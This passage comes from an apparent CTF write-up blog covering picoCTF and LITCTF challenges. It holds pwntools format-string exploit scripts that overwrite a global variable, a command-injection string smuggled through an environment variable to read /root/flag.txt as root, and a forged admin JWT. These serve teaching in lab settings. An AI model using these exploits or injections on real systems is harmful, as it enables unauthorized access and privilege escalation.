class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sus = 0x%x\n&quot;</span>, sus);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can do better!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Below are the important parts summarized:</p><p><code>int sus = 0x21737573;</code></p><ol><li>Global integer variable <code>sus</code> is initialized with the hex value <code>0x21737573</code>.</li><li>The value it’s initialized with doesn’t really matter, we’re going to have to change it to get the flag anyways.</li></ol><p><code>if (sus == 0x67616c66), printf(&quot;I have NO clue how you did that, you must be a wizard. Here you go...\n&quot;);</code></p><ol><li>Checks if <code>sus</code> is equal to <code>0x67616c66</code></li><li>If <code>sus</code> <em>is</em> equal to <code>0x67616c66</code>, we get the flag</li></ol><p>So all we need to do is change the variable <code>sus</code> to equal <code>0x67616c66</code></p><h2 id="Finding-sus’s-address"><a href="#Finding-sus’s-address" class="headerlink" title="Finding sus’s address"></a>Finding sus’s address</h2><p>Before changing the <code>sus</code> variable, we need to understand where it’s being stored. To find that, I decided to use obj, but realistically any decompiler can work. The command I ran was:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~/Downloadss &gt; objdump -t ./vuln | grep sus</span><br><span class="line">0000000000404060 g     O .data0000000000000004              sus</span><br><span class="line"></span><br><span class="line">~/Downloadss &gt;</span><br></pre></td></tr></table></figure><p>From this, we know that the memory address where <code>sus</code> is being stored is <code>0x404060</code> (the <code>0x</code> is there because all memory addresses start with this).</p><p>From here, I recalled the challenge’s hint- that pwntools would be crucial to beating this.</p><h2 id="Experimenting"><a href="#Experimenting" class="headerlink" title="Experimenting"></a>Experimenting</h2><p>Firstly, we can try to read stack values:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;rhea.picoctf.net&#x27;</span>,<span class="number">61512</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;%1$llx,%2$llx,%3$llx,%4$llx,%5$llx,%6$llx,WEAREHERE&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><ul><li>The numbers (1, 2, 3 ,4 ,5 ,6), specify the offset on the stack</li><li>This use the <code>llx</code> modifier is so that we print 8 bytes rather than 4</li></ul><p>After running this python script, we receive this output:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; python3 solve.py</span><br><span class="line">[&lt;] Opening connection to rhea.picoctf.net on port 61512: Trying 3.13[+] Opening connection to rhea.picoctf.net on port 61512: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">You don&#x27;t have what it takes. Only a true wizard could change my suspicions. What do you have to say?</span><br><span class="line">Here&#x27;s your input: 402075,0,7ab445893a00,0,10962b0,7ab4458e5af0,WEAREHERE</span><br><span class="line">sus = 0x21737573</span><br><span class="line">You can do better!</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>This doesn’t give us anything though. If we put each individual hex through <a href="https://gchq.github.io/CyberChef/">Cyberchef</a>, it just returns gibberish.</p><p>From here, we can modify the specific offsets we want to read, instead of doing <code>%1$llx,%2$llx,%3$llx</code> and so forth, we can try to do <code>%17$llx,%18$llx,%19$llx</code> etc.</p><p>Now, our script looks like this:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;rhea.picoctf.net&#x27;</span>,<span class="number">64870</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;%17$llx,%18$llx,%19$llx,WEAREHERE&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><ul><li>This read and print the value at the 17th, 18th, and 19th position (offset) ont he stack using the <code>llx</code> modifier, to ensure we read all 8 bytes, rather than 4</li><li><code>WEAREHERE</code> serves as a marker so that we can identify where our input is on the stack.</li></ul><p>After running this, our output looks like this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; python3 solve.py</span><br><span class="line">[+] Opening connection to rhea.picoctf.net on port 64870: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">You don&#x27;t have what it takes. Only a true wizard could change my suspicions. What do you have to say?</span><br><span class="line">Here&#x27;s your input: 5245484552414557,7e1fb8cb0045,7e1fb8cbcf78,WEAREHERE</span><br><span class="line">sus = 0x21737573</span><br><span class="line">You can do better!</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>When we put this into Cyberchef, we notice that we’ve successfully located where we are in the stack.<br><img src="/assets/img/formatstring-2/cyberchef.png" alt="format string 2"></p><h2 id="Writing-to-the-stack"><a href="#Writing-to-the-stack" class="headerlink" title="Writing to the stack"></a>Writing to the stack</h2><p>Now, what we can try to do is move to the address <code>0x404060</code> (the address where sus is located), and then <code>0x404060</code> (2 forward). This way we can try to write half a number at the time.</p><p><strong>Keep in mind</strong>: the bytes in the memory are stored in little endian order. In little-endian systems, the least significant byte (LSB) of a multi-byte value is stored first (at the lowest memory address), and the most significant byte (MSB) is stored last (at the highest memory address). <strong>This is why we’re writing the addresses “backwards”</strong>.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payloads = <span class="string">b&#x27;%17$llx,%18$llx,%19$llx,%20$llx,%21$llx,%22$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00WEAREHERE&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;rhea.picoctf.net&#x27;</span>,<span class="number">60978</span>)</span><br><span class="line">r.sendline(payloads)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>Our output should look something like this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; python3 solve.py</span><br><span class="line">[+] Opening connection to rhea.picoctf.net on port 60978: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">You don&#x27;t have what it takes. Only a true wizard could change my suspicions. What do you have to say?</span><br><span class="line">Here&#x27;s your input: 2c786c6c24303225,2c786c6c24313225,2c786c6c24323225,404060,404062,5245484552414557,`@@</span><br><span class="line">sus = 0x21737573</span><br><span class="line">You can do better!</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>The <code>404060,404062</code> part indicates we were successful with moving to our desired part in the stack.</p><p>But remember: our goal isn’t to just overwrite sus, it’s to overwrite it to specifically <code>0x67616c66</code>. But because it’s in little endian order, we need to write the first half, AKA the <strong>low-order bytes</strong>, <code>0x6761</code> and then the second half, AKA the <strong>high-order bytes</strong>, <code>6c66</code>. If we convert <code>0x6761</code> from hexadecimal to decimal, we get <code>26465</code>. Meaning we need to push a value of <code>26465</code> to get to <code>0x6761</code>. The script below accomplishes this.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;rhea.picoctf.net&#x27;</span>,<span class="number">57321</span>)</span><br><span class="line">s = r.recvuntil(<span class="string">&#x27;say?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;%26464d,%20$hnx%,20$llx,%21$llx,%22$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00WEAREHERE&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>Let’s break down this script step-by-step:</p><p><code>%26464d,</code> : This ensures our output string has 26465 characters (notice the <code>,</code> also counts as a character)</p><p><code>%20$hn</code> : This specifier writes 2 bytes (half a word) to the memory address that’s stored on the <em>20th</em> argument on the stack. This use the <code>%hn</code> modifier to ensure that we only modify the lower-order 2 bytes.</p><p>Our output:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sus = 0x67617573</span><br><span class="line">You can do better!</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Closed connection to rhea.picoctf.net port 57321</span><br></pre></td></tr></table></figure><p><em>Notice the first 4 numbers of sus has changed?</em></p><p>Now we just need to write the high order bytes, <code>0x6c66</code>, which is <code>27750</code> when converted to decimal. Since we’ve already written <code>26465</code> for the low order bytes, we just need to write 1285 more characters:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;rhea.picoctf.net&#x27;</span>,<span class="number">55608</span>)</span><br><span class="line">s = r.recvuntil(<span class="string">&#x27;say?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;%26464d,%20$hn%1281dAAAA%19$hnx,%22$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00WEAREHERE&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>One final time, let’s break this down:</p><ul><li><code>1281d</code> - This specifies that 1281 characters should be printed</li><li><code>AAAA</code> - Placeholder padding (4 characters)</li><li><code>%19$hn</code> - Writes 2-byte value (or half-word) to the 19th stack. The <code>hn</code> modifier will write the high-order bytes.</li></ul><p>Output:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I have NO clue how you did that, you must be a wizard. Here you go...</span><br><span class="line">picoCTF&#123;f0rm47_57r?_f0rm47_m3m_f43e6ccc&#125;[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>This have our flag!: <code>picoCTF&#123;f0rm47_57r?_f0rm47_m3m_f43e6ccc&#125;</code></p><h2 id="Bonus-the-automatic-way"><a href="#Bonus-the-automatic-way" class="headerlink" title="Bonus: the automatic way"></a>Bonus: the automatic way</h2><p>If you don’t really care to learn how to manually execute a format string vulnerability, I’ve left a pwntools script below:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># use &#x27;objdump -t ./vuln | grep sus&#x27; to find sus address</span></span><br><span class="line">addr = <span class="number">0x404060</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;rhea.picoctf.net&#x27;</span></span><br><span class="line">port = <span class="number">50181</span></span><br><span class="line"></span><br><span class="line">p = remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ELF object loadss binary &#x27;vuln&#x27; which is what we&#x27;re exploiting</span></span><br><span class="line">context.binary = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a function called &#x27;send_payloads&#x27;, send a payloads to the remote service and receive all data sent back from the remote service</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payloads</span>(<span class="params">payloads</span>):</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    p.sendline(payloads)</span><br><span class="line">    <span class="keyword">return</span> p.recvall()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initializes a FmtStr object and analyzes the format string vulnerabilities</span></span><br><span class="line">autofmt = FmtStr(send_payloads)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sets the offset</span></span><br><span class="line">offset = autofmt.offset</span><br><span class="line"></span><br><span class="line">payloads = fmtstr_payloads(offset, &#123;addr: <span class="number">0x67616c66</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Payloads: <span class="subst">&#123;payloads&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payloads)</span><br><span class="line"></span><br><span class="line">output = p.recvall()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Writing and understanding a format string payloads</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="picoCTF2024" scheme="https://rivers.sh/categories/CTF/picoCTF2024/"/>
    
    
    <category term="Medium" scheme="https://rivers.sh/tags/Medium/"/>
    
    <category term="Format String" scheme="https://rivers.sh/tags/Format-String/"/>
    
    <category term="Binary Exploitation" scheme="https://rivers.sh/tags/Binary-Exploitation/"/>
    
  </entry>
  
  <entry>
    <title>VNE</title>
    <link href="https://rivers.sh/posts/VNE/"/>
    <id>https://rivers.sh/posts/VNE/</id>
    <published>2024-08-21T04:00:00.000Z</published>
    <updated>2025-04-03T08:25:15.755Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h1><p>description:<br><code>This’ve got a binary that can list directories as root, try it out !! ssh to saturn.picoctf.net:59803, and run the binary named “bin” once connected. Login as ctf-player with the password, af86add3</code></p><p>author: Junias Bonou</p><p><img src="/images/VNE/vne.png" alt="vne"></p><h2 id="Attempts"><a href="#Attempts" class="headerlink" title="Attempts"></a>Attempts</h2><p>Upon connecting, I ran <code>pwd</code> and <code>ls</code> to see what we have:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ctf-player@pico-chall$ pwd</span><br><span class="line">/home/ctf-player</span><br><span class="line">ctf-player@pico-chall$ ls</span><br><span class="line">bin</span><br></pre></td></tr></table></figure><p>I tried navigating around with <code>cd</code>, until I finally found something interesting:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctf-player@pico-chall$ cd ..</span><br><span class="line">ctf-player@pico-chall$ ls</span><br><span class="line">bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr</span><br><span class="line">boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var</span><br><span class="line">ctf-player@pico-chall$ cd challenge</span><br><span class="line">-bash: cd: challenge: Permission denied</span><br></pre></td></tr></table></figure><p>A challenge folder, which the flag is probably inside of. Unfortunately, we can’t navigate into it. Next, I tried seeing if sudo was available, to no success.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ctf-player@pico-chall$ sudo</span><br><span class="line">-bash: sudo: command not found</span><br><span class="line">ctf-player@pico-chall$</span><br></pre></td></tr></table></figure><p>Finally, I want back to ctf-player to try and execute the binary we’re given. Unfortunately, upon trying to execute it, I’m met with a problem:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctf-player@pico-chall$ ls</span><br><span class="line">bin</span><br><span class="line">ctf-player@pico-chall$ ./bin</span><br><span class="line">Error: SECRET_DIR environment variable is not set</span><br><span class="line">ctf-player@pico-chall$</span><br></pre></td></tr></table></figure><p>Okay, so lets try setting the <code>SECRET_DIR</code> environment variable:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctf-player@pico-chall$ export SECRET_DIR=/</span><br><span class="line">ctf-player@pico-chall$ ./bin</span><br><span class="line">Listing the content of / as root:</span><br><span class="line">bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr</span><br><span class="line">boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var</span><br><span class="line">ctf-player@pico-chall$</span><br></pre></td></tr></table></figure><h2 id="Understanding-the-Challenge"><a href="#Understanding-the-Challenge" class="headerlink" title="Understanding the Challenge"></a>Understanding the Challenge</h2><p>The binary called “bin” that we’ve been executing, reads directories with root permissions, so when we set <code>SECRET_DIR=/</code>, it read everything in &#x2F; as root. Using this information, we can use the environment variable to poke around different directories, starting with <code>/challenge</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ctf-player@pico-chall$ export SECRET_DIR=/challenge</span><br><span class="line">ctf-player@pico-chall$ ./bin</span><br><span class="line">Listing the content of /challenge as root:</span><br><span class="line">config-box.py  metadata.json  profile</span><br><span class="line">ctf-player@pico-chall$ export SECRET_DIR=/root</span><br><span class="line">ctf-player@pico-call$ ./bin</span><br><span class="line">Listing the contents of /root as root:</span><br><span class="line">flag.txt</span><br><span class="line">ctf-player@pico-chall$</span><br></pre></td></tr></table></figure><p>So, while <code>/challenge</code> didn’t yield any success, <code>/root</code> shows us where the flag is, and that it’s in a <code>.txt</code>. Which is great and all, but how can we actually read the contents of it? As seen previously, <code>bin</code> only reads directories, so it doesn’t serve any use… unless we can chain commands…</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctf-player@pico-chall$ export SECRET_DIR=&quot;ls /root | cat /root/flag.txt&quot;</span><br><span class="line">ctf-player@pico-chall$ ./bin</span><br><span class="line">Listing the content of ls /root | cat /root/flag.txt as root:</span><br><span class="line">picoCTF&#123;Power_t0_man!pul4t3_3nv_1670f174&#125;ls: cannot access &#x27;ls&#x27;: No such file or directory</span><br><span class="line">ctf-player@pico-chall$</span><br></pre></td></tr></table></figure><p>flag: <code>picoCTF&#123;Power_t0_man!pul4t3_3nv_1670f174&#125;</code></p>]]></content>
    
    
    <summary type="html">Abusing environment variables</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="picoCTF2024" scheme="https://rivers.sh/categories/CTF/picoCTF2024/"/>
    
    
    <category term="Binary" scheme="https://rivers.sh/tags/Binary/"/>
    
    <category term="Environment" scheme="https://rivers.sh/tags/Environment/"/>
    
    <category term="Injection" scheme="https://rivers.sh/tags/Injection/"/>
    
    <category term="Medium" scheme="https://rivers.sh/tags/Medium/"/>
    
  </entry>
  
  <entry>
    <title>JWT</title>
    <link href="https://rivers.sh/posts/jwt/"/>
    <id>https://rivers.sh/posts/jwt/</id>
    <published>2024-08-13T04:00:00.000Z</published>
    <updated>2025-04-03T08:24:23.294Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JWT-1"><a href="#JWT-1" class="headerlink" title="JWT-1"></a>JWT-1</h1><h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p><code>I just made a website. Since cookies seem to be a thing of the old days, I updated my authentication! With these modern web technologies, I will never have to deal with sessions again. Come try it out at http://litctf.org:31781/.</code></p><h2 id="Understanding-what-a-JWT-is"><a href="#Understanding-what-a-JWT-is" class="headerlink" title="Understanding what a JWT is"></a>Understanding what a JWT is</h2><p>The link that I’m given for this challenge is <code>http://litctf.org:31781/</code>. Before even messing with it though, I googled “JWT” to get some further context.</p><p>I found <a href="https://en.wikipedia.org/wiki/JSON_web_Token">this</a> Wikipedia page. The quick summary, however, is this:</p><p><code>JSON Web Token is a proposed Internet standard for creating data with optional signature and/or optional encryption whose payloads holds JSON that asserts some number of claims. The tokens are signed either using a private secret or a public/private key.</code></p><h2 id="Attempts"><a href="#Attempts" class="headerlink" title="Attempts"></a>Attempts</h2><p>Next, I visited the link, where I was greeted with this:</p><p><img src="/images/JWT-1/getflag.png" alt="Default page for the site"></p><p>Naturally, my first response was to hit the giant button that screams “GET FLAG”. This obviously didn’t provide anything (that’d be too easy, and that’s no fun).</p><p><img src="/images/JWT-1/unauthorized.png" alt="unauthorized screen"></p><p>Then, I want back to the “Log in” page, and decided to log in with the user <code>admin</code> and the password <code>admin</code>, since alot of bad sites will use these as the default. This didn’t work though, and I started to just try a bunch of different combinations, but each returned the same result:</p><p><img src="/images/JWT-1/unauthorized.png" alt="login screen"></p><h2 id="Getting-there…"><a href="#Getting-there…" class="headerlink" title="Getting there…"></a>Getting there…</h2><p>Finally realizing this challenge wouldn’t be <strong>THAT</strong> easy, I opened up <a href="https://en.wikipedia.org/wiki/Burp_Suite">Burp Suite</a> to try and map out the site (maybe there’s a hidden directory!).</p><p>I couldn’t find any hidden directories though, so I altered my approach, instead of trying to map out the site, I tried intercepting through Burpsuite.</p><p><img src="/images/JWT-1/intercept.png" alt="intercept on burpsuite"></p><p>Mostly, it looked like a normal site, but one thing did catch my eye- a cookie with the value of <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMTIzIiwiYWRtaW4iOmZhbHNlfQ.0Pi%2FH9Rz7ylX%2FM1MwPS469hjUu3b9gV0%2Fl8EW6roQC0</code>:</p><p><img src="/images/JWT-1/burpsuite.png" alt="burpsuite screenshot"></p><p>This immediately led me to think: “Can I manipulate this token to get admin?..” So, I went back to the “GET FLAG” screen, and decided to inspect element to take a look at the cookies:</p><p><img src="/images/JWT-1/cookies.png" alt="cookies"></p><p>For awhile, I messed with the <code>value</code> field. I tried changing it to <code>admin</code>, <code>123</code>, etc. Eventually, the correlation struck me- the “value” is actually a JWT (JSON Web Token)</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>One of the first results when googling “JWT” is a site called <a href="https://jwt.io/">jwt.io</a>. This site lets us decode and modify JWT tokens, so it’s crucial to beating the challenge:</p><p><img src="/images/JWT-1/jwtio.png" alt="jwt.io"></p><p>I decided to put the token I had into the “Encoded” field, and noticed that the information in the “PAYLOAD” field reflected the login credentials I had tried earlier.</p><p><img src="/images/JWT-1/jwtpayload.png" alt="payloads"></p><p>From there, I tried modifying the “admin” value from <code>false</code> to <code>true</code>, and noticed that the encoded field automatically updated to reflect the changes.</p><p><img src="/images/JWT-1/newjwt.png" alt="new token"></p><p>Then, I went back to Burpsuite intercept, and replaced the old  cookie token with the <strong>NEW</strong> token (which is the same token, but with we modified <code>admin: true</code>), which for me was. I hit “forward”, and got the flag.</p><p>flag: <code>LITCTF&#123;o0ps_forg0r_To_v3rify_1re4DV9&#125;</code></p><h1 id="JWT-2"><a href="#JWT-2" class="headerlink" title="JWT-2"></a>JWT-2</h1><h2 id="Challenge-Info-1"><a href="#Challenge-Info-1" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p><code>its like jwt-1 but this one is harder. URL: http://litctf.org:31777/</code></p><p>attached: <a href="https://drive.google.com/uc?export=downloads&id=18gNp6DphcZBI5UmGjKsXhCkZvF1aIB6F&name=index.ts">index.ts</a></p><p><img src="/images/JWT-2/challenge.png" alt="JWT-2"></p><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>While this <em>is</em> a separate challenge, its fundamentals are heavily derived from the <a href="/posts/jwt1">first</a> JWT challenge, which I heavily recommend you read first.</p><h2 id="Trying-the-first-solution"><a href="#Trying-the-first-solution" class="headerlink" title="Trying the first solution"></a>Trying the first solution</h2><p>Since this is a continuation of the <strong>first</strong> JWT challenge, I figured I’d try the same solution. A quick recap on how I beat the first one:</p><ol><li>Register an account on the given site</li><li>Use Burpsuite intercept to capture the JWT associated with our account</li><li>Use <a href="https://jwt.io/">jwt.io</a> to read the contents of our JWT</li><li>Modify <code>admin</code> so that it equals to <code>true</code></li><li>Access the “GET FLAG” button with our <strong>new</strong> JWT and acquire flag</li></ol><p>For this challenge, while I <strong>was</strong> able to capture the JWT token and modify it to have <code>admin</code> set to <code>true</code>, upon actually using it, I was greeted with this:</p><p><img src="/images/JWT-2/unauthorized.png" alt="unauthorized"></p><h2 id="Inspecting-the-attached-TypeScript-file"><a href="#Inspecting-the-attached-TypeScript-file" class="headerlink" title="Inspecting the attached TypeScript file"></a>Inspecting the attached TypeScript file</h2><p>By now, I realized this challenge wouldn’t be as simple as the last one, so I decided to skim through the attached TypeScript file, which I’ll leave down below:</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">&quot;express&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> cookieParser <span class="keyword">from</span> <span class="string">&quot;cookie-parser&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&quot;path&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> fs <span class="keyword">from</span> <span class="string">&quot;fs&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> crypto <span class="keyword">from</span> <span class="string">&quot;crypto&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">accounts</span>: [<span class="built_in">string</span>, <span class="built_in">string</span>][] = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> jwtSecret = <span class="string">&quot;xook&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> jwtHeader = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(</span><br><span class="line">  <span 